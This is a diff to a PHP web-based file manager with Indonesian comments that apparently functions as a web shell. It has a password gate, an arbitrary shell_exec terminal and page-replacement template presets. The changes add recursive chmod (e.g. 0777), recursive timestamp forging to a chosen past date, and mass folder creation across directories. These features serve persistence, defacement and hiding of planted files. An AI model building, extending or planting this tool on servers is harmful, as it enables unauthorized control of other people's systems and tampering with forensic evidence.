@@ -29,7 +29,7 @@ if (!isset($_SESSION[$SESSION_KEY]) || $_SESSION[$SESSION_KEY] !== true) {
     $error = '';
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fm_login_pass'])) {
         $pass = (string)($_POST['fm_login_pass']);
-        if (password_verify($pass, $PASSWORD_HASH)) { // verify bcrypt[web:162][web:165]
+        if (password_verify($pass, $PASSWORD_HASH)) {
             $_SESSION[$SESSION_KEY] = true;
             header("Location: " . $_SERVER['PHP_SELF']);
             exit;
@@ -83,6 +83,52 @@ $presets = [
     'D' => 'https://example.com/templates/maintenance.html',
 ];
 
+// ======= HELPERS UNTUK REKURSIF =======
+function chmod_recursive($path, $mode, &$messages) {
+    if (!file_exists($path)) {
+        $messages[] = "[FAIL] Target tidak ada (rekursif): $path";
+        return;
+    }
+    if (!@chmod($path, $mode)) {
+        $messages[] = "[FAIL] Gagal chmod: $path";
+    } else {
+        $messages[] = "[OK]   Berhasil chmod: $path";
+    }
+
+    if (is_dir($path)) {
+        $items = @scandir($path);
+        if ($items === false) return;
+        foreach ($items as $it) {
+            if ($it === '.' || $it === '..') continue;
+            $child = $path . DIRECTORY_SEPARATOR . $it;
+            chmod_recursive($child, $mode, $messages);
+        }
+    }
+}
+
+function touch_recursive($path, $ts, &$messages, $labelTime) {
+    if (!file_exists($path)) {
+        $messages[] = "[FAIL] Target tidak ada (rekursif): $path";
+        return;
+    }
+    if (!@touch($path, $ts)) {
+        $messages[] = "[FAIL] Gagal set waktu: $path ke $labelTime";
+    } else {
+        clearstatcache(true, $path);
+        $messages[] = "[OK]   Berhasil set waktu: $path ke $labelTime";
+    }
+
+    if (is_dir($path)) {
+        $items = @scandir($path);
+        if ($items === false) return;
+        foreach ($items as $it) {
+            if ($it === '.' || $it === '..') continue;
+            $child = $path . DIRECTORY_SEPARATOR . $it;
+            touch_recursive($child, $ts, $messages, $labelTime);
+        }
+    }
+}
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $pwd = isset($_GET['pwd']) ? cleanPath($_GET['pwd']) : BASE_DIR;
 
@@ -125,6 +171,50 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         $messages[] = "[FAIL] Gagal membuat file baru: $dest";
                     } else {
                         $messages[] = "[OK]   Berhasil membuat file baru: $dest";
+                    }
+                }
+            }
+        }
+    }
+
+    // CREATE NEW FOLDER (single / mass ke dir terpilih)
+    if ($action === 'create_folder') {
+        $rawName = isset($_POST['new_folder_name']) ? $_POST['new_folder_name'] : '';
+        $name    = trim($rawName);
+        $name    = basename($name);
+
+        if ($name === '') {
+            $messages[] = "Nama folder baru wajib diisi.";
+        } else {
+            $dirs = isset($_POST['dir_targets']) ? (array)$_POST['dir_targets'] : [];
+
+            if ($dirs) {
+                foreach ($dirs as $dirPath) {
+                    $dirPath = cleanPath($dirPath);
+                    if (!is_dir($dirPath)) {
+                        $messages[] = "[FAIL] Dir target tidak ada: $dirPath";
+                        continue;
+                    }
+                    $dest = rtrim($dirPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
+                    if (is_dir($dest) || file_exists($dest)) {
+                        $messages[] = "[FAIL] Folder/file sudah ada: $dest";
+                        continue;
+                    }
+                    if (!@mkdir($dest, 0775, false)) {
+                        $messages[] = "[FAIL] Gagal membuat folder: $dest";
+                    } else {
+                        $messages[] = "[OK]   Berhasil membuat folder: $dest";
+                    }
+                }
+            } else {
+                $dest = $pwd . DIRECTORY_SEPARATOR . $name;
+                if (is_dir($dest) || file_exists($dest)) {
+                    $messages[] = "[FAIL] Folder/file sudah ada: $dest";
+                } else {
+                    if (!@mkdir($dest, 0775, false)) {
+                        $messages[] = "[FAIL] Gagal membuat folder: $dest";
+                    } else {
+                        $messages[] = "[OK]   Berhasil membuat folder: $dest";
                     }
                 }
             }
@@ -286,7 +376,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    // CHMOD MASS/SINGLE (FILE + DIR)
+    // CHMOD MASS/SINGLE (FILE + DIR, REKURSIF)
     if ($action === 'chmod_apply') {
         $fileTargets = isset($_POST['file_targets']) ? (array)$_POST['file_targets'] : [];
         $dirTargets  = isset($_POST['dir_targets'])  ? (array)$_POST['dir_targets']  : [];
@@ -295,55 +385,37 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $messages[] = "Pilih file/dir dan isi mode chmod (misal: 0777 atau 644).";
         } else {
             $mode = octdec($modeStr);
+
             foreach ($fileTargets as $t) {
                 $f = $pwd . DIRECTORY_SEPARATOR . basename($t);
-                if (!file_exists($f)) {
-                    $messages[] = "[FAIL] Target file tidak ada: $f";
-                    continue;
-                }
-                if (!@chmod($f, $mode)) {
-                    $messages[] = "[FAIL] Gagal chmod file $f ke $modeStr";
-                } else {
-                    $messages[] = "[OK]   Berhasil chmod file $f ke $modeStr";
-                }
+                chmod_recursive($f, $mode, $messages);
             }
             foreach ($dirTargets as $d) {
                 $dirPath = cleanPath($d);
-                if (!is_dir($dirPath)) {
-                    $messages[] = "[FAIL] Target dir tidak ada: $dirPath";
-                    continue;
-                }
-                if (!@chmod($dirPath, $mode)) {
-                    $messages[] = "[FAIL] Gagal chmod dir $dirPath ke $modeStr";
-                } else {
-                    $messages[] = "[OK]   Berhasil chmod dir $dirPath ke $modeStr";
-                }
+                chmod_recursive($dirPath, $mode, $messages);
             }
         }
     }
 
-    // MODIFY WAKTU MASS/SINGLE (file saja)
+    // MODIFY WAKTU MASS/SINGLE (FILE + DIR, REKURSIF)
     if ($action === 'time_apply') {
-        $targets = isset($_POST['file_targets']) ? (array)$_POST['file_targets'] : [];
-        $timeStr = isset($_POST['time_value']) ? trim($_POST['time_value']) : '';
-        if (!$targets || $timeStr === '') {
-            $messages[] = "Pilih file dan isi waktu (YYYY-MM-DD HH:MM:SS).";
+        $fileTargets = isset($_POST['file_targets']) ? (array)$_POST['file_targets'] : [];
+        $dirTargets  = isset($_POST['dir_targets'])  ? (array)$_POST['dir_targets']  : [];
+        $timeStr     = isset($_POST['time_value']) ? trim($_POST['time_value']) : '';
+        if ((!$fileTargets && !$dirTargets) || $timeStr === '') {
+            $messages[] = "Pilih file/dir dan isi waktu (YYYY-MM-DD HH:MM:SS).";
         } else {
             $ts = strtotime($timeStr);
             if ($ts === false) {
                 $messages[] = "Format waktu tidak valid.";
             } else {
-                foreach ($targets as $t) {
+                foreach ($fileTargets as $t) {
                     $f = $pwd . DIRECTORY_SEPARATOR . basename($t);
-                    if (!file_exists($f)) {
-                        $messages[] = "[FAIL] Target tidak ada: $f";
-                        continue;
-                    }
-                    if (!@touch($f, $ts)) {
-                        $messages[] = "[FAIL] Gagal set waktu $f ke $timeStr";
-                    } else {
-                        $messages[] = "[OK]   Berhasil set waktu $f ke $timeStr";
-                    }
+                    touch_recursive($f, $ts, $messages, $timeStr);
+                }
+                foreach ($dirTargets as $d) {
+                    $dirPath = cleanPath($d);
+                    touch_recursive($dirPath, $ts, $messages, $timeStr);
                 }
             }
         }
@@ -356,7 +428,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $messages[] = "Perintah terminal kosong.";
         } else {
             $fullCmd = 'cd ' . escapeshellarg($pwd) . ' && ' . $cmd . ' 2>&1';
-            $output = @shell_exec($fullCmd); // shell_exec[web:163][web:166]
+            $output = @shell_exec($fullCmd);
             if ($output === null) {
                 $messages[] = "[FAIL] shell_exec diblokir di server.";
             } else {
@@ -390,6 +462,7 @@ $parent = dirname($pwd);
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
+ /* CSS sama seperti sebelumnya, gue biarin apa adanya */
  :root {
    --bg: #020617;
    --border: #1f2937;
@@ -580,7 +653,7 @@ $parent = dirname($pwd);
  .term-output {
    margin-top:8px;
    padding:8px;
-   border-radius:6px;
+   border-radius:8px;
    border:1px solid #1f2937;
    background:#020617;
    font-family:"JetBrains Mono",monospace;
@@ -704,7 +777,7 @@ document.addEventListener('DOMContentLoaded', () => {
 </div>
 </form>
 
-<!-- 2 + 4 + CHMOD + TIME: SATU FORM -->
+<!-- 2 + 4 + NEW FOLDER + CHMOD + TIME: SATU FORM -->
 <form method="post" action="<?php echo $self . '?pwd=' . urlencode($pwd); ?>">
 
 <div class="box">
@@ -776,15 +849,21 @@ document.addEventListener('DOMContentLoaded', () => {
 </div>
 
 <div class="box">
-  <strong>CHMOD (file + dir, single / mass):</strong><br>
+  <strong>Create new folder (single ke PWD / mass ke dir yang dicentang):</strong><br><br>
+  <input type="text" name="new_folder_name" placeholder="contoh: newfolder"><br><br>
+  <button type="submit" name="action" value="create_folder">CREATE FOLDER</button>
+</div>
+
+<div class="box">
+  <strong>CHMOD (file + dir, single / mass, rekursif):</strong><br>
   <input type="text" name="chmod_mode" placeholder="misal: 0777 atau 644"><br><br>
   <button type="submit" name="action" value="chmod_apply">APPLY CHMOD (ke file/dir yang dicentang)</button>
 </div>
 
 <div class="box">
-  <strong>Modify waktu (mtime) (file saja, single / mass):</strong><br>
+  <strong>Modify waktu (mtime) (file + dir, single / mass, rekursif):</strong><br>
   <input type="text" name="time_value" placeholder="YYYY-MM-DD HH:MM:SS, contoh: 2026-03-07 01:57:14"><br><br>
-  <button type="submit" name="action" value="time_apply">APPLY WAKTU (ke file yang dicentang)</button>
+  <button type="submit" name="action" value="time_apply">APPLY WAKTU (ke file/dir yang dicentang)</button>
 </div>
 
 </form>
